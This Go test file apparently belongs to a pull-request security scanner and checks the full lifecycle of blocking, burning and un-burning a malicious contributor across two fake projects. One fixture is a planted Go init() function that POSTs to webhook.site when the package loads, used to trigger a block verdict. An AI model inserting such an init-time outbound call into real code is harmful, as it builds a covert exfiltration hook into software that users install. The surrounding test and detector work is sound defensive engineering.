package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"maps"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/profile"
	ghclient "github.com/sarahmaeve/signatory/internal/signal/github"
	"github.com/sarahmaeve/signatory/internal/store"
)

// TestFunctional_BurnUserLifecycle is the full functional test for
// burning a malicious PR author. One user (mallory) submits PRs across
// two projects, all against ONE temp store, driving the real pr-scan
// path (real clone of local fixtures, fake GitHub API, real store):
//
//  1. innocuous PR to project #1   → scanned, clears (accepted)
//  2. good PR to project #2        → scanned, clears (accepted)
//  3. malicious PR to project #1   → scanned, BLOCKS (located); the
//     operator then burns the user identity
//  4. any PR to project #2         → REFUSED by the author-burn gate
//     before any clone/scan (rejected without analysis)
//  5. same PR with --refresh       → forensic re-scan proceeds past the
//     gate, but stderr carries a loud "DANGER: PR AUTHOR IS BURNED"
//  6. withdraw the burn, re-scan   → the default gate no longer refuses,
//     and the cascade clears (a mistaken burn is reversible)
//
// It also pins the contributor-burn cascade and its live surfacing: once
// mallory is burned, the previously-accepted innocuous PR (#1) reads as
// effectively burned via its author identity, and `pr-scan summary`
// reports that active burn.
func TestFunctional_BurnUserLifecycle(t *testing.T) {
	t.Parallel()
	const author = "mallory"

	// Project #1 (octo/hello): an innocuous PR (#1) and a malicious PR
	// (#3). The malicious file POSTs to webhook.site at init time — a
	// documented exfil shape that forces a block verdict.
	innocuous := map[string]string{
		"internal/widget/widget.go": "package widget\n\ntype Widget struct{}\n",
	}
	malicious := map[string]string{
		"internal/telemetry/init.go": "package telemetry\n\nimport \"net/http\"\n\n" +
			"func init() {\n\t_, _ = http.Post(\"https://webhook.site/abc123\", \"\", nil)\n}\n",
	}
	proj1Dir, proj1Base, proj1Heads := initMultiPRRepo(t, map[int]map[string]string{
		1: innocuous,
		3: malicious,
	})

	// Project #2 (octo/world): a good PR (#2) and a later benign PR (#4)
	// that the burned user submits in steps 4-6.
	good := map[string]string{
		"pkg/util/util.go": "package util\n\nfunc Noop() {}\n",
	}
	later := map[string]string{
		"pkg/util/extra.go": "package util\n\nfunc Extra() {}\n",
	}
	proj2Dir, proj2Base, proj2Heads := initMultiPRRepo(t, map[int]map[string]string{
		2: good,
		4: later,
	})

	srv := multiPRGitHubServer(t, author, []burnTestPR{
		{repo: "hello", number: 1, baseSHA: proj1Base, headSHA: proj1Heads[1], files: sortedKeysOf(innocuous)},
		{repo: "world", number: 2, baseSHA: proj2Base, headSHA: proj2Heads[2], files: sortedKeysOf(good)},
		{repo: "hello", number: 3, baseSHA: proj1Base, headSHA: proj1Heads[3], files: sortedKeysOf(malicious)},
		{repo: "world", number: 4, baseSHA: proj2Base, headSHA: proj2Heads[4], files: sortedKeysOf(later)},
	})

	redirect := redirectClonesByURL(map[string]string{
		"https://github.com/octo/hello": proj1Dir,
		"https://github.com/octo/world": proj2Dir,
	})

	globals := testGlobals(t) // ONE store shared across every scan.
	// runScan drives one pr-scan; refresh toggles the --refresh flag.
	// Returns captured stderr (for the burn-warning assertion) and the
	// command error.
	runScan := func(target string, refresh bool) (string, error) {
		var errBuf bytes.Buffer
		cmd := &PRScanCheckCmd{
			Target:  target,
			Refresh: refresh,
			Client:  ghclient.NewClientWithBaseURL(srv.URL),
			RunGit:  redirect,
			Path:    filepath.Join(t.TempDir(), "clone"),
			Stdout:  io.Discard,
			Stderr:  &errBuf,
		}
		err := cmd.Run(globals)
		return errBuf.String(), err
	}

	// --- Step 1: innocuous PR to project #1 → accepted. ---
	_, err := runScan("octo/hello#1", false)
	require.NoError(t, err, "an innocuous PR clears")
	requireVerdict(t, globals, "patch:github/octo/hello/1", "clear")
	// The author identity is minted on first contact — the entity that
	// will later be burned already exists.
	requireEntityExists(t, globals, "identity:github/mallory")

	// --- Step 2: good PR to project #2 → accepted. ---
	_, err = runScan("octo/world#2", false)
	require.NoError(t, err, "a good PR clears")
	requireVerdict(t, globals, "patch:github/octo/world/2", "clear")

	// --- Step 3: malicious PR to project #1 → located (block). ---
	_, err = runScan("octo/hello#3", false)
	require.ErrorIs(t, err, ErrPRDefenseBlocked, "the malicious PR must be located and blocked")
	requireVerdict(t, globals, "patch:github/octo/hello/3", "block")

	// ...then the operator burns the user identity (the decision made
	// after locating the malicious PR — a burn is deliberate, not an
	// automatic consequence of a block verdict).
	burnEntity(t, globals, "identity:github/mallory", "malicious PR: webhook.site exfil in init()")

	// Cascade: every patch mallory already authored now reads as
	// effectively burned via the author identity — including the
	// previously-accepted innocuous PR #1.
	requireCascadeBurnViaAuthor(t, globals, "patch:github/octo/hello/1", "identity:github/mallory")

	// pr-scan summary must surface that ACTIVE burn live — even on the
	// innocuous PR #1, which scanned clean before the author was burned.
	requireSummaryBurned(t, globals, "octo/hello#1", "author identity:github/mallory")

	// --- Step 4: any PR to project #2 → rejected WITHOUT analysis. ---
	_, err = runScan("octo/world#4", false)
	require.ErrorIs(t, err, ErrPRAuthorBurned, "a burned user's new PR must be refused by the author-burn gate")
	require.NotErrorIs(t, err, ErrPRDefenseBlocked, "the refusal is a gate rejection, not a scan-derived block")
	// Proof it was refused before any analysis: no patch entity was even
	// minted for PR #4 — the gate returns before the scan/persist path.
	requireEntityAbsent(t, globals, "patch:github/octo/world/4")

	// --- Step 5: --refresh forces a forensic re-scan past the gate, but
	// LOUDLY flags the burned author. ---
	stderr, err := runScan("octo/world#4", true)
	require.NoError(t, err, "--refresh proceeds past the author-burn gate (benign content clears)")
	assert.Contains(t, stderr, "DANGER: PR AUTHOR IS BURNED",
		"--refresh must still warn that the author is burned")
	requireVerdict(t, globals, "patch:github/octo/world/4", "clear")

	// --- Step 6: withdrawing the burn re-opens the default gate and
	// clears the cascade — a mistaken burn is fully reversible. ---
	withdrawBurn(t, globals, "identity:github/mallory", "false positive on review")
	_, err = runScan("octo/world#4", false)
	require.NoError(t, err, "with the burn withdrawn, the default gate no longer refuses")
	requireNoEffectiveBurn(t, globals, "patch:github/octo/hello/1")
}

// --- fixtures ---

// burnTestPR is one PR the multi-PR GitHub server should serve. owner is
// always "octo"; repo is the bare repo name ("hello" / "world").
type burnTestPR struct {
	repo    string
	number  int
	baseSHA string
	headSHA string
	files   []string
}

// initMultiPRRepo builds a git repo with a base commit on main plus one
// PR commit per entry in prFiles, each reachable ONLY via
// refs/pull/<n>/head (the PR branch is deleted, so a plain clone of main
// cannot reach it). Generalizes initPRFixtureRepoWithBase to several PRs
// on one repo. Returns the repo dir, the base SHA, and head SHA by PR
// number.
func initMultiPRRepo(t *testing.T, prFiles map[int]map[string]string) (repoDir, baseSHA string, heads map[int]string) {
	t.Helper()
	dir := t.TempDir()
	git := func(args ...string) { runGitInFunctional(t, dir, args...) }
	writeAll := func(files map[string]string) {
		for path, content := range files {
			full := filepath.Join(dir, filepath.FromSlash(path))
			require.NoError(t, os.MkdirAll(filepath.Dir(full), 0o755))
			require.NoError(t, os.WriteFile(full, []byte(content), 0o644))
			git("add", path)
		}
	}

	git("init", "-b", "main", "-q")
	git("config", "user.email", "test@example.invalid")
	git("config", "user.name", "Test")
	git("config", "commit.gpgsign", "false")
	git("commit", "--allow-empty", "-m", "base")
	baseSHA = gitOutputInFunctional(t, dir, "rev-parse", "HEAD")

	heads = make(map[int]string, len(prFiles))
	// Deterministic order so test output is reproducible (map iteration
	// order would otherwise vary); each PR branches from main
	// independently, so order doesn't affect the result.
	for _, n := range slices.Sorted(maps.Keys(prFiles)) {
		branch := fmt.Sprintf("pr-%d", n)
		git("checkout", "-q", "-b", branch, "main")
		writeAll(prFiles[n])
		git("commit", "-q", "-m", fmt.Sprintf("pr %d", n))
		head := gitOutputInFunctional(t, dir, "rev-parse", "HEAD")
		git("update-ref", fmt.Sprintf("refs/pull/%d/head", n), head)
		heads[n] = head
		git("checkout", "-q", "main")
		git("branch", "-q", "-D", branch)
	}
	return dir, baseSHA, heads
}

// multiPRGitHubServer serves PR detail + files for every PR in prs (all
// authored by author), plus a /users/ handler for the author-profile
// fetch. Each PR's base.sha/head.sha are served verbatim so the real PR
// fetch + clone resolve against the matching fixture.
func multiPRGitHubServer(t *testing.T, author string, prs []burnTestPR) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	for _, pr := range prs {
		basePath := fmt.Sprintf("/repos/octo/%s/pulls/%d", pr.repo, pr.number)
		number, baseSHA, headSHA, files := pr.number, pr.baseSHA, pr.headSHA, pr.files
		mux.HandleFunc(basePath, func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprintf(w, `{"number":%d,"title":"x","html_url":"u","state":"open","draft":false,
				"user":{"login":%q,"type":"User"},
				"base":{"ref":"main","sha":%q},
				"head":{"ref":"feature","sha":%q},
				"additions":1,"deletions":0,"changed_files":1,"labels":[],
				"author_association":"FIRST_TIME_CONTRIBUTOR",
				"created_at":"2026-01-01T00:00:00Z","updated_at":"2026-01-01T00:00:00Z"}`,
				number, author, baseSHA, headSHA)
		})
		mux.HandleFunc(basePath+"/files", func(w http.ResponseWriter, _ *http.Request) {
			fmt.Fprint(w, prFilesJSON(files...))
		})
	}
	mux.HandleFunc("/users/", func(w http.ResponseWriter, r *http.Request) {
		who := strings.TrimPrefix(r.URL.Path, "/users/")
		fmt.Fprintf(w, `{"login":%q,"type":"User","created_at":"2011-01-25T18:44:36Z","public_repos":8,"followers":42}`, who)
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

// redirectClonesByURL is the multi-repo redirectCloneTo: it maps each
// production clone URL (https://github.com/<owner>/<repo>) to a local
// fixture dir, so PRs across several projects each clone the right
// fixture. The clone argv is ["clone", <url>, <dest>].
func redirectClonesByURL(byURL map[string]string) func(context.Context, string, ...string) error {
	return func(ctx context.Context, workdir string, args ...string) error {
		if len(args) > 0 && args[0] == "clone" {
			url := args[len(args)-2]
			dest := args[len(args)-1]
			dir, ok := byURL[url]
			if !ok {
				return fmt.Errorf("redirectClonesByURL: no fixture registered for clone url %q", url)
			}
			return defaultRunGit(ctx, "", "clone", "file://"+dir, dest)
		}
		return defaultRunGit(ctx, workdir, args...)
	}
}

func sortedKeysOf(m map[string]string) []string {
	return slices.Sorted(maps.Keys(m))
}

// --- store assertions ---

func requireVerdict(t *testing.T, globals *Globals, patchURI, wantVerdict string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	e, err := s.FindEntityByURI(context.Background(), patchURI)
	require.NoError(t, err, "patch entity %s must exist", patchURI)
	sigs, err := s.GetSignals(context.Background(), e.ID)
	require.NoError(t, err)
	var v string
	for _, sg := range sigs {
		if sg.Type == "pr_defense_verdict" {
			v = string(sg.Value)
		}
	}
	require.NotEmpty(t, v, "patch %s must carry a pr_defense_verdict", patchURI)
	assert.Contains(t, v, fmt.Sprintf(`"verdict":%q`, wantVerdict))
}

func requireEntityExists(t *testing.T, globals *Globals, uri string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	_, err = s.FindEntityByURI(context.Background(), uri)
	require.NoError(t, err, "%s must exist", uri)
}

func requireEntityAbsent(t *testing.T, globals *Globals, uri string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	_, err = s.FindEntityByURI(context.Background(), uri)
	require.ErrorIs(t, err, store.ErrNotFound, "%s must NOT have been minted", uri)
}

func burnEntity(t *testing.T, globals *Globals, uri, reason string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	e, err := s.FindEntityByURI(context.Background(), uri)
	require.NoError(t, err, "the user entity must exist before it can be burned")
	require.NoError(t, s.SetBurn(context.Background(), &profile.Burn{
		EntityID: e.ID,
		Reason:   reason,
		Source:   profile.BurnSourceLocal,
		BurnedAt: time.Now().UTC(),
		BurnedBy: "team:test",
	}))
}

func requireCascadeBurnViaAuthor(t *testing.T, globals *Globals, patchURI, viaURI string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	e, err := s.FindEntityByURI(context.Background(), patchURI)
	require.NoError(t, err)
	burn, ebCtx, err := s.EffectiveBurn(context.Background(), e.ID)
	require.NoError(t, err, "the patch must be effectively burned via its author")
	require.NotNil(t, burn)
	require.NotNil(t, ebCtx)
	assert.False(t, ebCtx.Direct, "the burn cascades from the author, not direct on the patch")
	require.NotNil(t, ebCtx.ViaOwner)
	assert.Equal(t, viaURI, ebCtx.ViaOwner.CanonicalURI)
	assert.Equal(t, "author", ebCtx.ViaRole)
}

func requireNoEffectiveBurn(t *testing.T, globals *Globals, patchURI string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	e, err := s.FindEntityByURI(context.Background(), patchURI)
	require.NoError(t, err)
	_, _, err = s.EffectiveBurn(context.Background(), e.ID)
	require.ErrorIs(t, err, store.ErrNotFound,
		"a withdrawn author burn must no longer cascade to the patch")
}

func withdrawBurn(t *testing.T, globals *Globals, uri, reason string) {
	t.Helper()
	s, err := store.OpenSQLite(context.Background(), globals.DBPath)
	require.NoError(t, err)
	defer s.Close() //nolint:errcheck // test cleanup
	e, err := s.FindEntityByURI(context.Background(), uri)
	require.NoError(t, err)
	require.NoError(t, s.WithdrawBurn(context.Background(), e.ID, "team:test", reason, time.Now().UTC()))
}

// requireSummaryBurned runs `pr-scan summary --json` and asserts the row
// for ref reports an active burn with the given via-label — proving the
// summary surfaces a LIVE burn, computed at summary time rather than at
// scan time.
func requireSummaryBurned(t *testing.T, globals *Globals, ref, wantVia string) {
	t.Helper()
	var buf bytes.Buffer
	require.NoError(t, (&PRScanSummaryCmd{JSON: true, Stdout: &buf}).Run(globals))
	var caps []capture
	require.NoError(t, json.Unmarshal(buf.Bytes(), &caps))
	for _, c := range caps {
		if c.Ref == ref {
			assert.True(t, c.Burned, "summary must mark %s as burned", ref)
			assert.Equal(t, wantVia, c.BurnVia)
			return
		}
	}
	t.Fatalf("ref %s not found in pr-scan summary output", ref)
}
